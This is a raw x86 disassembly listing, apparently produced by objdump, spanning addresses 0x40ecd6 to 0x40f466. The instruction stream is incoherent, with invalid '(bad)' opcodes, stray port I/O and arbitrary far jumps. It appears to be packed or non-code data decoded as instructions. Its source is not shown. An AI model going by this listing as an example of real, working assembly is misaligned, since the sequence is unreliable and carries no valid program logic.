  40ecd6:	mov    bl,0x17
  40ecd8:	mov    al,ds:0xc812bb0f
  40ecdd:	xor    al,BYTE PTR [ebx]
  40ecdf:	sbb    eax,0x29f1feb4
  40ece4:	jle    0x40ec76
  40ece6:	sub    eax,0xa6685a4e
  40eceb:	or     eax,0xd28c59a9
  40ecf0:	pushf  
  40ecf1:	cld    
  40ecf2:	ds pop edi
  40ecf4:	adc    eax,0xc8498b75
  40ecf9:	mov    ecx,0xdcf092d3
  40ecfe:	pop    ss
  40ecff:	cmp    eax,0xd1c8a584
  40ed04:	outs   dx,DWORD PTR ds:[esi]
  40ed05:	(bad)  
  40ed07:	cs mov bl,0xbe
  40ed0a:	shl    BYTE PTR [ebp-0x30],cl
  40ed0d:	pushf  
  40ed0e:	pop    DWORD PTR [ecx-0x37]
  40ed11:	inc    esi
  40ed12:	dec    ebx
  40ed13:	lea    esi,[edx+edi*4+0x76]
  40ed17:	pop    ebp
  40ed18:	pop    ebp
  40ed19:	in     eax,0x32
  40ed1b:	mov    al,ds:0x1d3ed54a
  40ed20:	adc    BYTE PTR [ebp+0x16c92f65],ah
  40ed26:	pop    ecx
  40ed27:	dec    eax
  40ed28:	rcl    cl,cl
  40ed2a:	dec    esp
  40ed2b:	xlat   BYTE PTR ds:[ebx]
  40ed2c:	jne    0x40ecf0
  40ed2e:	test   BYTE PTR [edi],al
  40ed30:	push   edx
  40ed31:	jmp    0x40ed84
  40ed33:	push   ebx
  40ed34:	cld    
  40ed35:	std    
  40ed36:	jbe    0x40ecce
  40ed38:	jmp    0x5f762bfb
  40ed3d:	loop   0x40ed4b
  40ed3f:	ds (bad) 
  40ed41:	aaa    
  40ed42:	sbb    edx,ecx
  40ed44:	out    0x4b,al
  40ed46:	jb     0x40ed9f
  40ed48:	mov    DWORD PTR [ebp+0x62f5213],eax
  40ed4e:	inc    eax
  40ed4f:	addr16 inc edx
  40ed51:	pop    ebp
  40ed52:	dec    edx
  40ed53:	fcomp  QWORD PTR [eax+eiz*1]
  40ed56:	icebp  
  40ed57:	cld    
  40ed58:	out    0x2c,eax
  40ed5a:	jne    0x40ed7b
  40ed5c:	pop    edi
  40ed5d:	jle    0x40ed0d
  40ed5f:	mov    esp,0x310666bd
  40ed64:	cmp    DWORD PTR [ebp-0x32],ebp
  40ed67:	push   ebx
  40ed68:	sti    
  40ed69:	jns    0x40edc4
  40ed6b:	or     ecx,DWORD PTR [ecx+0x40a3b624]
  40ed71:	lock pop eax
  40ed73:	jp     0x40ede6
  40ed75:	retf   
  40ed76:	popa   
  40ed77:	and    esi,DWORD PTR [ebx-0x22]
  40ed7a:	inc    ebp
  40ed7b:	push   esi
  40ed7c:	mov    bl,0x5b
  40ed7e:	mov    ebp,0xa58edd7a
  40ed83:	fcom   DWORD PTR [eax-0x4f24fd16]
  40ed89:	push   cs
  40ed8a:	cmp    DWORD PTR [ebp+0x62],ebx
  40ed8d:	shr    DWORD PTR [ebx+eax*2],0xc3
  40ed91:	fcomp  QWORD PTR [edi-0x69]
  40ed94:	pop    ebp
  40ed95:	retf   
  40ed96:	dec    esp
  40ed97:	push   0x4d
  40ed99:	mov    DWORD PTR [esi-0x6b52889e],eax
  40ed9f:	jge    0x40edfa
  40eda1:	fsub   st,st(2)
  40eda3:	not    BYTE PTR [ecx]
  40eda5:	(bad)  
  40eda6:	enter  0x123f,0xa3
  40edaa:	in     al,dx
  40edab:	add    DWORD PTR [ebp+edi*4+0x513845b6],eax
  40edb2:	sti    
  40edb3:	push   0x6610d950
  40edb8:	jb     0x40ed7f
  40edba:	pop    ss
  40edbb:	outs   dx,BYTE PTR ds:[esi]
  40edbc:	cmp    eax,0x3f3e64d7
  40edc1:	jne    0x40ee3f
  40edc3:	jmp    0x59bd:0x946ad4e0
  40edca:	mov    edi,DWORD PTR [edi-0x74]
  40edcd:	inc    ebp
  40edce:	jp     0x40ee30
  40edd0:	mov    ds:0xa22d78a8,al
  40edd5:	ins    BYTE PTR es:[edi],dx
  40edd6:	or     bh,ah
  40edd8:	pop    ebp
  40edd9:	dec    esp
  40edda:	jmp    0xa1a22e0b
  40eddf:	and    al,cl
  40ede1:	out    0xd3,eax
  40ede3:	in     al,dx
  40ede4:	or     eax,0xf9fa8907
  40ede9:	mov    al,0x43
  40edeb:	ret    0xc219
  40edee:	and    al,0x79
  40edf0:	jae    0x40ee34
  40edf2:	arpl   WORD PTR [edi+ecx*8+0x27],sp
  40edf6:	push   0x2f5a9861
  40edfb:	jecxz  0x40ee11
  40edfd:	or     al,0xb9
  40edff:	and    al,0xaa
  40ee01:	jne    0x40ee25
  40ee03:	test   eax,0x1db9c353
  40ee08:	sub    BYTE PTR [edi+0x32268bc0],0x3a
  40ee0f:	arpl   si,sp
  40ee11:	pop    ebx
  40ee12:	inc    eax
  40ee13:	pusha  
  40ee14:	std    
  40ee15:	add    ch,BYTE PTR [esp+ecx*4]
  40ee18:	sbb    edx,DWORD PTR [esi+0x71bf8dfc]
  40ee1e:	(bad)  
  40ee1f:	push   ebx
  40ee20:	ja     0x40ee4c
  40ee22:	lahf   
  40ee23:	cmp    al,bh
  40ee25:	sbb    eax,0x9f8f5e84
  40ee2a:	aas    
  40ee2b:	leave  
  40ee2c:	mov    ch,0xfb
  40ee2e:	push   es
  40ee2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee30:	aad    0x27
  40ee32:	and    ebp,DWORD PTR [edx]
  40ee34:	push   eax
  40ee35:	sbb    eax,0xc2954a23
  40ee3a:	pop    ecx
  40ee3b:	push   0x73
  40ee3d:	and    al,0x4
  40ee3f:	imul   ebx,DWORD PTR [ebx+0x14],0xbb6c6137
  40ee46:	(bad)  
  40ee47:	push   esp
  40ee48:	pop    ss
  40ee49:	enter  0xf2a4,0x45
  40ee4d:	fwait
  40ee4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee4f:	out    dx,al
  40ee50:	xchg   ecx,eax
  40ee51:	add    BYTE PTR [edi+0x4b38576c],dh
  40ee57:	mov    BYTE PTR [esi],bl
  40ee59:	imul   edi,DWORD PTR [ecx+0x133b8bc0],0xcb68c568
  40ee63:	inc    esp
  40ee64:	dec    edi
  40ee65:	sbb    eax,0x74c7a05d
  40ee6a:	pop    esp
  40ee6b:	mov    bl,bl
  40ee6d:	mov    DWORD PTR [eax+0x53dba211],edi
  40ee73:	pop    eax
  40ee74:	aaa    
  40ee75:	mov    dl,dh
  40ee77:	out    dx,eax
  40ee78:	jb     0x40ee27
  40ee7a:	mov    ds:0xa284e5b0,eax
  40ee7f:	fwait
  40ee80:	cs into 
  40ee82:	call   0x7fdbf517
  40ee87:	xlat   BYTE PTR ds:[ebx]
  40ee88:	pop    esi
  40ee89:	repnz sub eax,DWORD PTR [edx-0x7b]
  40ee8d:	loope  0x40eedc
  40ee8f:	xlat   BYTE PTR ds:[ebx]
  40ee90:	sbb    DWORD PTR [edx-0x183966d6],ebx
  40ee96:	pop    ebx
  40ee97:	sbb    cl,BYTE PTR [edx-0x18]
  40ee9a:	jmp    0x40ee28
  40ee9c:	sub    eax,0xe10cbac
  40eea1:	or     BYTE PTR [ebp-0xe],ah
  40eea4:	aam    0xba
  40eea6:	xchg   ebp,eax
  40eea7:	gs idiv ecx
  40eeaa:	ds out dx,al
  40eeac:	enter  0x737a,0x6c
  40eeb0:	mov    cl,0xf6
  40eeb2:	cmp    eax,0x36f6e545
  40eeb7:	imul   ecx,DWORD PTR [ebx],0x8a59275f
  40eebd:	retf   
  40eebe:	sbb    bl,cl
  40eec0:	sbb    dh,bl
  40eec2:	or     DWORD PTR [ecx+0x3de4ec72],ebp
  40eec8:	gs pop ds
  40eeca:	inc    ecx
  40eecb:	(bad)
  40eece:	push   0x29f92dc4
  40eed3:	(bad)  
  40eed4:	lods   eax,DWORD PTR ds:[esi]
  40eed5:	pop    ebp
  40eed6:	fwait
  40eed7:	cmp    BYTE PTR [ebp+0x7df6f7a0],dl
  40eedd:	xor    edi,DWORD PTR ds:0x3cb36247
  40eee3:	cmp    BYTE PTR [edx],bl
  40eee5:	push   edi
  40eee6:	inc    eax
  40eee7:	adc    esp,ebp
  40eee9:	add    BYTE PTR [edx],ch
  40eeeb:	fs inc eax
  40eeed:	arpl   WORD PTR [ecx-0x91e860e],bx
  40eef3:	mov    DWORD PTR gs:[ecx],eax
  40eef6:	inc    esp
  40eef7:	or     bh,dl
  40eef9:	in     al,dx
  40eefa:	add    BYTE PTR [eax-0x4a],al
  40eefd:	loop   0x40ef00
  40eeff:	xchg   esp,eax
  40ef00:	mov    eax,ds:0x6aab567e
  40ef05:	jo     0x40eee0
  40ef07:	arpl   WORD PTR [edx],ax
  40ef09:	sbb    DWORD PTR [edx-0x11d9bf4c],ecx
  40ef0f:	mov    bl,0x98
  40ef11:	lods   eax,DWORD PTR ds:[esi]
  40ef12:	shl    BYTE PTR gs:[ecx-0xa24ebbf],cl
  40ef19:	sti    
  40ef1a:	pop    DWORD PTR [esi-0x12e4694a]
  40ef20:	pop    edi
  40ef21:	sbb    al,0xbe
  40ef23:	or     BYTE PTR ds:0xc0c12f47,al
  40ef29:	adc    ebp,DWORD PTR [edi-0x22]
  40ef2c:	or     DWORD PTR [esi+0x41ec8fc2],ebx
  40ef32:	aaa    
  40ef33:	xchg   esp,eax
  40ef34:	cli    
  40ef35:	icebp  
  40ef36:	jmp    0x40ef24
  40ef38:	iret   
  40ef39:	nop
  40ef3a:	or     eax,0x9e1523f
  40ef3f:	sub    ah,BYTE PTR [edx+0x3b]
  40ef42:	fisubr DWORD PTR [edi-0x13487c11]
  40ef48:	scas   al,BYTE PTR es:[edi]
  40ef49:	fbstp  TBYTE PTR [ecx+0x42]
  40ef4c:	test   BYTE PTR [ebx],ah
  40ef4e:	stos   BYTE PTR es:[edi],al
  40ef4f:	or     DWORD PTR [eax],0xcb310cd8
  40ef55:	fstp   QWORD PTR [ebx+0x25]
  40ef58:	push   es
  40ef59:	lea    esp,[esi]
  40ef5b:	mov    eax,0x647fdbb
  40ef60:	or     BYTE PTR [esi],ch
  40ef62:	xchg   ebx,eax
  40ef63:	jle    0x40ef57
  40ef65:	out    dx,al
  40ef66:	inc    esi
  40ef67:	test   al,0x9c
  40ef69:	icebp  
  40ef6a:	fstp   st(6)
  40ef6c:	push   ecx
  40ef6d:	cmp    edi,DWORD PTR [esi+ecx*1+0x72]
  40ef71:	sbb    eax,0x1e678963
  40ef76:	sub    eax,0xe331d0f3
  40ef7b:	inc    eax
  40ef7c:	js     0x40efa7
  40ef7e:	mov    ds:0x6253f373,al
  40ef83:	ficomp DWORD PTR [edi]
  40ef85:	dec    esp
  40ef86:	daa    
  40ef87:	stos   DWORD PTR es:[edi],eax
  40ef88:	jo     0x40ef5b
  40ef8a:	mov    bl,0x97
  40ef8c:	outs   dx,DWORD PTR ds:[esi]
  40ef8d:	cmp    dl,BYTE PTR [edi+0x4b]
  40ef90:	ds icebp 
  40ef92:	call   0x48505103
  40ef97:	lock es mov edx,0xd1dc794c
  40ef9e:	jb     0x40ef5d
  40efa0:	pop    ebx
  40efa1:	xchg   edx,eax
  40efa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efa3:	xchg   edi,eax
  40efa4:	dec    ecx
  40efa5:	fdiv   QWORD PTR [edi+0x17b431c9]
  40efab:	xor    edi,DWORD PTR [eax-0x4c]
  40efae:	pop    ecx
  40efaf:	pushf  
  40efb0:	nop
  40efb1:	loop   0x40ef44
  40efb3:	aaa    
  40efb4:	cmp    eax,0x3ece8e38
  40efb9:	jp     0x40efaa
  40efbb:	(bad)  
  40efbc:	jge    0x40ef79
  40efbe:	push   0x73
  40efc0:	sub    esi,DWORD PTR [eax]
  40efc2:	pop    ds
  40efc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc5:	dec    edi
  40efc6:	dec    esp
  40efc7:	inc    esi
  40efc8:	ds mov cl,0x69
  40efcb:	adc    dh,dh
  40efcd:	pop    ebx
  40efce:	ins    DWORD PTR es:[edi],dx
  40efcf:	retf   0xc91c
  40efd2:	xchg   ebx,eax
  40efd3:	out    dx,al
  40efd4:	neg    ah
  40efd6:	push   es
  40efd7:	nop
  40efd8:	cmc    
  40efd9:	adc    al,0xd3
  40efdb:	or     esp,DWORD PTR [ecx+0x54194bfd]
  40efe1:	cmp    eax,edi
  40efe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efe4:	rcl    cx,cl
  40efe7:	cmp    esi,edi
  40efe9:	or     DWORD PTR [edx-0x708a159d],0xffffff9b
  40eff0:	mov    eax,ds:0x60609e56
  40eff5:	mov    WORD PTR [ebp-0x1c],ss
  40eff8:	mov    bl,BYTE PTR [ecx-0xc]
  40effb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40effc:	jb     0x40eff6
  40effe:	cld    
  40efff:	push   cs
  40f000:	or     dl,BYTE PTR [edx]
  40f002:	nop
  40f003:	cmp    eax,0x478f097c
  40f008:	pop    esi
  40f009:	cmp    ebx,DWORD PTR [edx+0x43cf9288]
  40f00f:	push   esp
  40f010:	xor    ebx,0xc64aefca
  40f016:	jecxz  0x40f010
  40f018:	cli    
  40f019:	data16 (bad) 
  40f01b:	in     eax,dx
  40f01c:	bound  ebx,QWORD PTR [eax+0x2298262a]
  40f022:	jl     0x40efd7
  40f024:	fidiv  DWORD PTR [edi+0x5259e58a]
  40f02a:	xchg   edi,eax
  40f02b:	in     al,dx
  40f02c:	adc    DWORD PTR ds:0x927d94a0,edi
  40f032:	jge    0x40f01e
  40f034:	adc    al,BYTE PTR [ecx]
  40f036:	adc    eax,0x5abc53f8
  40f03b:	add    eax,0xe35bee63
  40f040:	xor    ch,ch
  40f042:	ret    
  40f043:	sub    cl,BYTE PTR [ecx+0xf]
  40f046:	popf   
  40f047:	xor    DWORD PTR [esi-0x4a3a14ef],edx
  40f04d:	imul   esp,DWORD PTR [ecx+0x6e],0xfe11fdcb
  40f054:	out    dx,al
  40f055:	out    0xf8,eax
  40f057:	cdq    
  40f058:	sub    al,bl
  40f05a:	add    BYTE PTR [edx],ch
  40f05c:	mov    ds:0xa4fa622e,eax
  40f061:	fmul   DWORD PTR ds:[ebp-0x54]
  40f065:	(bad)  
  40f066:	loopne 0x40f083
  40f068:	sbb    BYTE PTR [ebx+edx*8],0xb1
  40f06c:	cmc    
  40f06d:	stc    
  40f06e:	imul   ecx,eax,0xdd334e9c
  40f074:	jne    0x40f081
  40f076:	mov    ah,BYTE PTR [edx]
  40f078:	add    al,0xa5
  40f07a:	fwait
  40f07b:	sbb    BYTE PTR [esi+0x7749da84],dl
  40f081:	mov    al,0x19
  40f083:	out    0x5c,al
  40f085:	arpl   WORD PTR [esi+0x51],di
  40f088:	les    edi,FWORD PTR [ecx+ebp*8-0x14]
  40f08c:	clc    
  40f08d:	mov    eax,ds:0x28650f3d
  40f092:	xor    DWORD PTR [edi+0x3f411aaf],edx
  40f098:	mov    edx,0x7ff93488
  40f09d:	xchg   edx,eax
  40f09e:	xchg   ecx,eax
  40f09f:	pop    DWORD PTR ds:0x77d4e237
  40f0a5:	jl     0x40f0a3
  40f0a7:	cs cs ja 0x40f114
  40f0ab:	leave  
  40f0ac:	pop    ebp
  40f0ad:	xor    al,0xdf
  40f0af:	add    ah,BYTE PTR [edx+ecx*4+0x66]
  40f0b3:	cmp    DWORD PTR [ecx],eax
  40f0b5:	dec    ebp
  40f0b6:	mov    esp,0x44a49613
  40f0bb:	push   ecx
  40f0bc:	test   BYTE PTR [ebx+ecx*4-0x70d826cd],0x8c
  40f0c4:	mov    WORD PTR [esp+ebp*2-0x1d641462],ss
  40f0cb:	call   0xdba:0x4799109
  40f0d2:	or     ebx,ecx
  40f0d4:	xor    BYTE PTR [ebp-0x59dcb2ed],ch
  40f0da:	aaa    
  40f0db:	out    dx,al
  40f0dc:	adc    al,0x8d
  40f0de:	push   cs
  40f0df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0e0:	add    BYTE PTR [ebx-0x4c826260],cl
  40f0e6:	lods   al,BYTE PTR ds:[esi]
  40f0e7:	jnp    0x40f156
  40f0e9:	inc    cx
  40f0eb:	mov    ecx,0xc6bf41b6
  40f0f0:	or     eax,0xbe2159fa
  40f0f5:	mov    DWORD PTR ds:0x9f9587bc,esi
  40f0fb:	push   esi
  40f0fc:	adc    al,0x74
  40f0fe:	pop    edi
  40f0ff:	or     BYTE PTR [ecx-0xf],ah
  40f102:	mov    bl,0x51
  40f104:	mov    BYTE PTR [ecx+0x1e685b5e],bl
  40f10a:	mov    BYTE PTR [ebx-0x57e1abf1],al
  40f110:	aad    0x7f
  40f112:	xchg   BYTE PTR [eax],dh
  40f114:	or     BYTE PTR [ebp-0x4c772a7d],0x55
  40f11b:	std    
  40f11c:	arpl   bx,di
  40f11e:	in     eax,0xca
  40f120:	jl     0x40f14d
  40f122:	xchg   BYTE PTR ds:0x1a143af6,ch
  40f128:	sti    
  40f129:	outs   dx,BYTE PTR ds:[esi]
  40f12a:	adc    eax,0xa94dc008
  40f12f:	xor    eax,DWORD PTR [ebx]
  40f131:	sbb    ch,ch
  40f133:	sbb    ah,bh
  40f135:	inc    esp
  40f136:	mov    esp,?
  40f138:	mov    bl,0xe6
  40f13a:	je     0x40f11a
  40f13c:	pushf  
  40f13d:	inc    ebp
  40f13e:	add    eax,0x8e7aba1e
  40f143:	daa    
  40f144:	or     dl,BYTE PTR [ebp+0x3d3d1df0]
  40f14a:	cli    
  40f14b:	mov    DWORD PTR [esp+eax*2-0x24f8787d],ebx
  40f152:	mov    bh,0x42
  40f154:	std    
  40f155:	loopne 0x40f0e5
  40f157:	jmp    0x40f14b
  40f159:	dec    esi
  40f15a:	aaa    
  40f15b:	inc    edx
  40f15c:	jl     0x40f1b6
  40f15e:	fsub   DWORD PTR [esi]
  40f160:	mov    bh,0x51
  40f162:	push   es
  40f163:	dec    ebp
  40f165:	add    al,BYTE PTR [edx+eax*4-0x15cfedab]
  40f16c:	stc    
  40f16d:	dec    eax
  40f16e:	les    esp,FWORD PTR [eax]
  40f170:	push   eax
  40f171:	xor    BYTE PTR [eax-0x7],dl
  40f174:	scas   eax,DWORD PTR es:[edi]
  40f175:	ss bnd js 0x40f1d8
  40f179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f17a:	xor    eax,0x7d475ece
  40f17f:	fmulp  st(6),st
  40f181:	iret   
  40f182:	lahf   
  40f183:	arpl   WORD PTR [edx-0x25],si
  40f186:	pop    es
  40f187:	xor    al,0x40
  40f189:	dec    edi
  40f18a:	cmp    eax,0x26d0a4ad
  40f18f:	adc    eax,DWORD PTR [esi-0xc]
  40f192:	or     ecx,DWORD PTR [eax-0x1a]
  40f195:	(bad)  
  40f196:	pop    ss
  40f197:	jno    0x40f120
  40f199:	(bad)  
  40f19a:	inc    ebp
  40f19b:	into   
  40f19c:	daa    
  40f19d:	or     edi,esi
  40f19f:	popa   
  40f1a0:	out    0x91,eax
  40f1a2:	test   DWORD PTR [edx-0x1525b44c],0x82a6f889
  40f1ac:	fld    DWORD PTR [ebx-0x61]
  40f1af:	adc    al,BYTE PTR es:[esi]
  40f1b2:	cmp    edx,esi
  40f1b4:	cmp    edx,DWORD PTR [edi+0x2]
  40f1b7:	pop    eax
  40f1b8:	adc    DWORD PTR gs:[ecx+0x47],ebx
  40f1bc:	sbb    al,bl
  40f1be:	mov    al,0xe1
  40f1c0:	mov    cl,0x27
  40f1c2:	fisttp DWORD PTR [ebp+0x5ffbc75a]
  40f1c8:	inc    edx
  40f1c9:	stos   DWORD PTR es:[edi],eax
  40f1ca:	add    edx,DWORD PTR [ecx-0x20cab543]
  40f1d0:	pop    ecx
  40f1d1:	jae    0x40f1eb
  40f1d3:	icebp  
  40f1d4:	or     al,0x80
  40f1d6:	mov    dl,BYTE PTR ds:0xfff3a70b
  40f1dc:	dec    ebx
  40f1dd:	loop   0x40f1d2
  40f1df:	jl     0x40f178
  40f1e1:	out    dx,al
  40f1e2:	je     0x40f192
  40f1e4:	mov    ah,0xda
  40f1e6:	sub    eax,DWORD PTR [edx+0x48]
  40f1e9:	inc    ecx
  40f1ea:	fistp  WORD PTR [edx+eax*8+0x3404d2ce]
  40f1f1:	cmp    BYTE PTR [esi+0x74],ah
  40f1f4:	jle    0x40f203
  40f1f6:	ja     0x40f226
  40f1f8:	mov    ds:0xad42d8d0,al
  40f1fd:	jg     0x40f1e1
  40f1ff:	sbb    eax,0xe9ad722e
  40f204:	mov    bh,0x26
  40f206:	or     DWORD PTR [edx+0x6144e055],esi
  40f20c:	test   BYTE PTR [ebp-0x36],ch
  40f20f:	pop    ecx
  40f210:	cmc    
  40f211:	sub    DWORD PTR [eax+edi*4+0xd8de5fb],ecx
  40f218:	bnd jle 0x40f1a0
  40f21b:	dec    ebp
  40f21c:	xor    ebx,DWORD PTR [edi+0x46]
  40f21f:	mov    al,ds:0xd6a7acce
  40f224:	sbb    cl,BYTE PTR [esi-0x53]
  40f227:	fld    TBYTE PTR ds:0x2568ea35
  40f22d:	or     DWORD PTR [ebp+0x4a],edx
  40f230:	push   edx
  40f231:	mov    eax,ds:0x40c841d6
  40f236:	mov    esp,0x7f203b4
  40f23b:	mov    eax,0x15d9d149
  40f240:	mov    ds:0xab81d5e0,eax
  40f245:	pop    ds
  40f246:	pushf  
  40f247:	fwait
  40f248:	addr16 cld 
  40f24a:	jns    0x40f220
  40f24c:	mov    al,ds:0xbac06b6c
  40f251:	sub    BYTE PTR [ebp-0x467bf4f1],0xcf
  40f258:	(bad)  
  40f259:	es int 0xf0
  40f25c:	inc    esi
  40f25d:	jnp    0x40f243
  40f25f:	sub    al,0xed
  40f261:	adc    ecx,DWORD PTR ds:0x84e1427b
  40f267:	jecxz  0x40f26a
  40f269:	and    BYTE PTR [eax+0x1c],dh
  40f26c:	xchg   esi,eax
  40f26d:	jecxz  0x40f22d
  40f26f:	shl    DWORD PTR [ebp+0x18],0xa3
  40f273:	mov    esp,0x35c3577d
  40f278:	sahf   
  40f279:	mov    gs,WORD PTR [edx-0x1ae620f8]
  40f27f:	jnp    0x40f249
  40f281:	les    edx,FWORD PTR [esi+0x63]
  40f284:	inc    ebp
  40f285:	cli    
  40f286:	sti    
  40f287:	sub    eax,DWORD PTR [eax-0x43]
  40f28a:	in     al,0x86
  40f28c:	push   ecx
  40f28d:	cmp    eax,0xc80b3bde
  40f292:	retf   
  40f293:	add    edi,esp
  40f295:	xchg   edx,eax
  40f296:	aas    
  40f297:	iret   
  40f298:	cmp    dh,cl
  40f29a:	(bad)  
  40f29c:	ss inc esp
  40f29e:	sbb    eax,0xa34f39fe
  40f2a3:	xor    al,0xf5
  40f2a5:	push   esp
  40f2a6:	les    ebx,FWORD PTR [esi-0x66]
  40f2a9:	js     0x40f2db
  40f2ab:	lock add DWORD PTR [edx+0x37b121b3],edx
  40f2b2:	pop    es
  40f2b3:	jno    0x40f261
  40f2b5:	push   cs
  40f2b6:	sbb    eax,0xa023a949
  40f2bb:	fisttp QWORD PTR [edi+0x3b0ca24c]
  40f2c1:	and    bl,ch
  40f2c3:	addr16 int 0x39
  40f2c6:	sbb    bh,BYTE PTR [ebp*8+0x5c0d663d]
  40f2cd:	bound  edx,QWORD PTR [ebx-0x7d]
  40f2d0:	enter  0x1670,0x57
  40f2d4:	xchg   ebx,eax
  40f2d5:	jl     0x40f29c
  40f2d7:	cmp    bl,BYTE PTR [ebp+edx*2+0x366f73b3]
  40f2de:	imul   BYTE PTR [ebp+0x4c]
  40f2e1:	stc    
  40f2e2:	and    BYTE PTR [ebp+0x14],bh
  40f2e5:	call   edx
  40f2e7:	stos   BYTE PTR es:[edi],al
  40f2e8:	mov    eax,ds:0x85b3aa2e
  40f2ed:	add    esi,DWORD PTR [ecx-0x56]
  40f2f0:	push   ebx
  40f2f1:	adc    DWORD PTR [esi],0x58907567
  40f2f7:	and    esp,DWORD PTR [edi-0x2]
  40f2fa:	hlt    
  40f2fb:	jmp    0x40f30c
  40f2fd:	neg    DWORD PTR [esi+eax*1+0x6f]
  40f301:	cs or  eax,0x6b3880c6
  40f307:	sbb    DWORD PTR [eax-0x25bfc740],edx
  40f30d:	loope  0x40f300
  40f30f:	mov    BYTE PTR [ecx+0x5130a182],al
  40f315:	mov    eax,eax
  40f317:	test   DWORD PTR [eax+0x6ef22f97],ebp
  40f31d:	mov    ds:0xf894a432,al
  40f322:	mov    bl,0x92
  40f324:	cmp    al,0xb
  40f326:	outs   dx,BYTE PTR ds:[esi]
  40f327:	popa   
  40f328:	inc    esi
  40f329:	shl    bh,cl
  40f32b:	cmp    DWORD PTR [edx+eax*4+0x7f737231],0x156f845d
  40f336:	rep outs dx,BYTE PTR ds:[esi]
  40f338:	stc    
  40f339:	jp     0x40f2dd
  40f33b:	sbb    al,0x6
  40f33d:	aad    0xff
  40f33f:	push   0xab83e517
  40f344:	pop    es
  40f345:	cs pop ebx
  40f347:	pop    es
  40f348:	xchg   ecx,eax
  40f349:	or     ecx,DWORD PTR [ebx]
  40f34b:	cmp    esp,DWORD PTR [edx]
  40f34d:	xor    DWORD PTR [ebp-0x74],esi
  40f350:	jno    0x40f345
  40f352:	xor    ebx,DWORD PTR [ecx-0x5f]
  40f355:	sub    eax,0x8dbd9536
  40f35a:	fninit 
  40f35c:	push   cs
  40f35d:	aas    
  40f35e:	xchg   esi,eax
  40f35f:	push   es
  40f360:	leave  
  40f361:	jbe    0x40f371
  40f363:	inc    ebp
  40f364:	test   BYTE PTR [edi+0x7f9adc5f],bl
  40f36a:	ins    BYTE PTR es:[edi],dx
  40f36b:	int3   
  40f36c:	xchg   edx,eax
  40f36d:	and    DWORD PTR [ecx+0x9],edx
  40f370:	int    0xcc
  40f372:	sub    dl,BYTE PTR [eax]
  40f374:	cmp    DWORD PTR [esi+0x3b],esp
  40f377:	xchg   DWORD PTR [edi],ecx
  40f379:	cli    
  40f37a:	pop    esp
  40f37b:	and    DWORD PTR [edi-0x5f],ebp
  40f37e:	stos   DWORD PTR es:[edi],eax
  40f37f:	xchg   BYTE PTR [ebx],al
  40f381:	ss xchg ebp,eax
  40f383:	lds    esp,FWORD PTR [ebp+ebp*1+0xd]
  40f387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f388:	xchg   ebp,eax
  40f389:	mov    ch,0xa1
  40f38b:	sti    
  40f38c:	arpl   WORD PTR [edi-0x360a9853],si
  40f392:	stos   BYTE PTR es:[edi],al
  40f393:	mov    bl,0xa2
  40f395:	lds    edi,FWORD PTR [ebx+0x1b]
  40f398:	arpl   WORD PTR [ecx+0x42],bp
  40f39b:	xchg   edx,eax
  40f39c:	mov    bh,0xc
  40f39e:	test   BYTE PTR [ebx-0x4f98f533],ch
  40f3a4:	or     edi,ecx
  40f3a6:	mov    bl,0xd1
  40f3a8:	xchg   ebx,eax
  40f3a9:	dec    esp
  40f3aa:	xchg   BYTE PTR [ecx-0xb],bl
  40f3ad:	ds jmp 0x22d4:0x8bbf1059
  40f3b5:	mov    edi,?
  40f3b7:	adc    DWORD PTR [eax-0x1e],edi
  40f3ba:	sub    bh,BYTE PTR [eax-0x7f]
  40f3bd:	mov    edi,0x41ffaffd
  40f3c2:	adc    al,0xfa
  40f3c4:	test   eax,0x8804fb4a
  40f3c9:	push   edx
  40f3ca:	retf   
  40f3cb:	rol    DWORD PTR [edx],0x7d
  40f3ce:	cmp    eax,0x369da3b
  40f3d3:	bt     ecx,eax
  40f3d6:	xchg   BYTE PTR [eax-0x7aaab9d0],ah
  40f3dc:	jb     0x40f3e4
  40f3de:	and    DWORD PTR [edx+0x24ed92dc],eax
  40f3e4:	sbb    esi,DWORD PTR [edx-0x3531595c]
  40f3ea:	gs jne 0x40f3ab
  40f3ed:	inc    edx
  40f3ee:	hlt    
  40f3ef:	ins    BYTE PTR es:[edi],dx
  40f3f0:	mov    ds:0x677b8a61,eax
  40f3f5:	jno    0x40f418
  40f3f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3f8:	xlat   BYTE PTR ds:[ebx]
  40f3f9:	xor    DWORD PTR [ebx+ecx*1-0x5e917bfd],esi
  40f400:	jne    0x40f397
  40f402:	mov    ebx,0xc245d7f5
  40f407:	out    dx,eax
  40f408:	mov    ch,BYTE PTR [ebx+edx*4+0x8]
  40f40c:	mov    ah,0xda
  40f40e:	push   edi
  40f40f:	mov    es,eax
  40f411:	(bad)  
  40f413:	adc    BYTE PTR [ecx],0x77
  40f416:	mov    eax,ds:0x64d65d38
  40f41b:	jge    0x40f3bf
  40f41d:	loopne 0x40f39f
  40f41f:	and    edx,DWORD PTR [eax-0x3d]
  40f422:	cld    
  40f423:	gs mov ah,0x1a
  40f426:	not    BYTE PTR cs:[edi-0x9]
  40f42a:	inc    ebx
  40f42b:	adc    bl,ah
  40f42d:	and    ecx,DWORD PTR [ebx]
  40f42f:	add    edi,0xf155b71a
  40f435:	jl     0x40f497
  40f437:	into   
  40f438:	ret    
  40f439:	adc    edx,edx
  40f43b:	add    esp,DWORD PTR [edi-0x3415fdbb]
  40f441:	jnp    0x40f4a8
  40f443:	xor    bl,BYTE PTR [eax]
  40f445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f446:	sbb    cl,BYTE PTR [edi+edx*2]
  40f449:	mov    bh,0xdc
  40f44b:	in     eax,dx
  40f44c:	(bad)  
  40f44d:	shr    DWORD PTR [ebx],1
  40f44f:	mov    WORD PTR ds:0x2b3d62db,fs
  40f455:	or     al,0xad
  40f457:	mov    esi,?
  40f459:	repnz sub eax,0xb8acf350
  40f45f:	dec    eax
  40f460:	xchg   DWORD PTR [edi-0x16740df2],eax
  40f466:	cmp    al,0x29
